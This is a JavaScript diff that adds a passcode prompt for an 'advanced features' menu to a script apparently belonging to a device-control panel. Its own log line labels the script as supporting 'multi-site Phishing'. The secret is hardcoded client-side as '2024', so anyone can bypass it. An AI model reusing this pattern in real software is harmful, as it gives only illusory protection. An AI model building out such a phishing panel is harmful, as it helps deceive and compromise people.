@@ -1649,5 +1649,31 @@ window.denyDevice = denyDevice;
 window.revokeDevice = revokeDevice;
 window.unblockDevice = unblockDevice;
 window.toggleDeviceAccess = toggleDeviceAccess;
+// ═══════════════════════════════════════════
+// 🔐 زر المميزات المتقدمة — محمي بكود سري
+// ═══════════════════════════════════════════
+const ADVANCED_CODE = "2024"; // ← غيّر الكود ده لأي حاجة عايزها
 
+function requestAdvancedCode() {
+    // التحقق إن في جهاز مختار
+    if (!currentDevice) {
+        alert('⚠️ اختر جهاز أولاً');
+        return;
+    }
+
+    const entered = prompt('🔐 أدخل كود المميزات المتقدمة:');
+    if (entered === null) return;
+
+    if (entered.trim() === ADVANCED_CODE) {
+        console.log('✅ كود صح — فتح المميزات');
+        openAdvancedMenu();
+    } else {
+        alert('❌ كود خاطئ');
+        console.log('❌ كود خاطئ:', entered);
+    }
+}
+
+window.requestAdvancedCode = requestAdvancedCode;
+
+console.log('%c🔐 Advanced code protection active', 'color: #ff0066; font-weight: bold;');
 console.log('%c✅ SPECTER-7 script loaded (with multi-site Phishing)', 'color: #00ffcc; font-weight: bold;');
